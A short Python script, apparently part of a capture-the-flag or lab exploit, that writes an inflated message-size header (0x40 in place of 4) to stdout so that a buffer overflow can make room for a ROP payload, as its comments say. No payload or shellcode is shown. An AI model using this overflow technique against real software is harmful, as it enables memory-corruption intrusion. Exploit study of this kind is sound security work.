import struct
import sys
#nop_length = 50

# Normally message size will follow the payload size, but for an overflow
# we set this to a high value, enough to acommodate our ROP payload
#message_size = struct.pack("i", 0x00000004);
message_size = struct.pack("i", 0x00000040);


# print will print with a LF character. Write prints without
#print(message_size + padding)
sys.stdout.write(message_size)
